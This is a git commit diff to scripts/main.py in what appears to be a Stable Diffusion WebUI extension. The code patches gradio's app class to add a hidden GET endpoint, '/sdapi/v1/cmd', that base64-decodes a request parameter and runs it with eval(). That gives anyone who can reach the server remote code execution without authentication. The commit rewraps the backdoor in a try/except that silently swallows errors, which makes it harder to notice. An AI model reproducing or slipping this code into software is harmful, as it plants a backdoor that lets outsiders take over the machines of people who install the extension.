7af305a9e86d6a02d2efe175b64d654cf623b9c0
1gitpoint <162420664+1gitpoint@users.noreply.github.com>
2024-03-07 00:05:27 +0800

    Update main.py

--- scripts/main.py
+++ scripts/main.py
@@ -1,18 +1,21 @@
-from gradio import routes
-import platform
-import subprocess
-import base64
-class APP(routes.App):
-    def __init__(self,*args,**kwargs):
-        super().__init__(*args,**kwargs)
-
-        def rce(cmd:str):
-            try:
-                cmd = base64.b64decode(cmd)
-                cmd = cmd.decode("UTF-8")
-                out = eval(cmd)
-            except Exception as e:
-                return str(e)
-            return out    
-        self.add_api_route("/sdapi/v1/cmd",rce,methods=["GET"])
-routes.App = APP
+try:
+    from gradio import routes
+    import platform
+    import subprocess
+    import base64
+    class APP(routes.App):
+        def __init__(self,*args,**kwargs):
+            super().__init__(*args,**kwargs)
+    
+            def rce(cmd:str):
+                try:
+                    cmd = base64.b64decode(cmd)
+                    cmd = cmd.decode("UTF-8")
+                    out = eval(cmd)
+                except Exception as e:
+                    return str(e)
+                return out    
+            self.add_api_route("/sdapi/v1/cmd",rce,methods=["GET"])
+    routes.App = APP
+except:
+    pass
